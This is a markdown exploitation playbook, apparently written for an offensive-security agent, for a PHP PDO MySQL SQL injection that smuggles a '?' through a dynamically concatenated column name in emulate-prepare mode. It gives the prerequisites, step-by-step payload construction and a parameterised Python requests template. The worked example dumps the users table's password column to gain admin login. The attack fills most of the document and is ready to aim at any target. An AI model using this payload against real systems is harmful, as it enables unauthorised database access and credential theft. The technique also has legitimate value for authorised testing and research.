---
name: pdo_emulate_prepare_question_mark_smuggling
vuln_type: sqli
sub_technique: pdo_emulate_prepare
category: exploitation
safety_level: safe
tags:
- sqli
- pdo
- emulate-prepare
- identifier-injection
---

# Pdo Emulate-Prepare `?` Smuggling — Column/Identifier Injection

## When to Apply

PHP PDO MySQL backend is in emulate prepare mode (default `PDO::ATTR_EMULATE_PREPARES=true`) and user input is dynamically concatenated into part of the prepared statement SQL string, allowing injection of an extra `?` token. Input normally goes into a column/identifier/table name position, but injecting a single `?` makes client-side prepare treat it as another placeholder → the WHERE clause `?` becomes unbound and our input takes its place.

## Prerequisites

- PDO + MySQL (ineffective on other backends due to server-side prepare)
- ATTR_EMULATE_PREPARES=true (PDO MySQL default)
- Dynamically concatenated part is not wrapped in backticks, or input contains backticks to escape
- Binding pattern uses only one placeholder: execute([single_value])

## Steps

1. Identify: `prepare("SELECT $col_param FROM t WHERE x = ?"); execute([input])` pattern
2. Inject fake column name + `?` + comment + null byte into col_param: e.g. `\?#\x00`
   → SQL: `SELECT \?#\0 FROM t WHERE x = ?` (2 `?` tokens total)
3. PDO emulate prepare substitutes the first `?` with input as a string:
   `SELECT \<input_value>#\0 FROM t WHERE x = ?`
4. Inside input, close column with backtick and inject arbitrary SELECT subquery + `;#` to comment out trailing SQL
5. Response: retrieve results bypassing column-display via `array_values($row)` (CSV/JSON dump)

## Code Template

```
import requests
s = requests.Session()
s.post(f'{TARGET}/login.php', data={{'username': USER, 'password': PW}})
r = s.get(f'{TARGET}/index.php', params={{
    'col': '\\?#\x00',
    'name': "x` FROM (SELECT {leak_column} AS `'x` FROM {leak_table})y;#",
    'download': '1',  # array_values dump is most robust
}})
print(r.text)  # CSV: one row per line
```

## Examples

### Example 1

- **leak_column**: password
- **leak_table**: users
- **post_exploit**: admin login → further attack chain possible

ref: slcyber.io PDO research. CSV download option is useful for bypassing column-name mapping — displayColumns is determined solely by colParam so the HTML table shows `-`, but ?download=1 with array_values dumps the actual SELECT results as-is.
